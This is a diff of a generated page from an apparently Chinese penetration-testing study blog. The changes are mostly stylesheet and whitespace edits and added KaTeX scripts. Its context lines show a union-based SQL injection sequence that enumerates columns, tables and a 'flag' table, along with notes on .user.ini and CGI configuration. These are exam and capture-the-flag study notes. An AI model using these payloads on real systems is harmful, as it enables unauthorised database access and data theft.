@@ -7,7 +7,8 @@
 
 <link rel='canonical' href='https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/'>
 
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='PTE知识记录'>
+
+<link rel="stylesheet" href="/scss/style.min.1a6eab8f97c7ad47119bcfe4ea87cc5227d4789df170608fabd9b3910bc037f2.css"><meta property='og:title' content='PTE知识记录'>
 <meta property='og:description' content='一些详细知识点的备忘
 '>
 <meta property='og:url' content='https://d4n-sec.github.io/p/pte%E7%9F%A5%E8%AF%86%E8%AE%B0%E5%BD%95/'>
@@ -408,11 +409,11 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 4 #								#列数为4
 </span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w"> </span><span class="o">#</span><span class="w">					</span><span class="o">#</span><span class="err">查看回显位</span><span class="w"> 
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; union select 1,database(),3,4 #			#查看数据库
+</span></span></span><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; union select 1,database(),3,4 #			#查看数据库
 </span></span></span><span class="line"><span class="cl"><span class="s1">
 </span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w"> </span><span class="o">#</span><span class="w">				 </span><span class="o">#</span><span class="err">查看当前数据库表名</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;</span><span class="n">flag</span><span class="s1">&#39;),3,4 #
+</span></span></span><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;</span><span class="n">flag</span><span class="s1">&#39;),3,4 #
 </span></span></span><span class="line"><span class="cl"><span class="s1">											#查看flag表的列名
 </span></span></span><span class="line"><span class="cl"><span class="s1">
 </span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">flag</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="w"> </span><span class="o">#</span><span class="w">
@@ -453,7 +454,7 @@
 <p><code>.user.ini</code> 的作用范围是本目录，子目录无效（测试php版本 5.3.29nts）且<code>.user.ini</code> 就是php.ini的当前目录下的临时配置（写法规则一样），所以优先级比php.ini高</p>
 <p>CGI程序就是配置了相关路径信息，访问特定URL目录和指定文件后，根据 Shebang 行找到解释器调用解析处理，标准输出接入到socket</p>
 <blockquote>
-<p>Apache 中的 ScriptAlias /cgi-b/ &ldquo;${SRVROOT}/cgi-bin/&rdquo; 指定了访问URL上的/cgi-b/目录时，会在本地${SRVROOT}/cgi-bin/下查找相应脚本（脚本后缀需要在httpd.conf注册，需要配置 Shebang 行）</p>
+<p>Apache 中的 ScriptAlias /cgi-b/ &ldquo;${SRVROOT}/cgi-bin/" 指定了访问URL上的/cgi-b/目录时，会在本地${SRVROOT}/cgi-bin/下查找相应脚本（脚本后缀需要在httpd.conf注册，需要配置 Shebang 行）</p>
 </blockquote>
 <p>FastCGI模式（猜测 会预先处理好脚本），运行脚本后不结束运行（CGI每次访问都会fork一次进程）</p>
 <p>还有其他CGI模式</p>
@@ -573,6 +574,31 @@ Clusterbomb:有点像两个嵌套的for循环，参数i和参数j，i=0，然后
     </footer>
 
 
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });
+    })
+</script>
     
 </article>
 
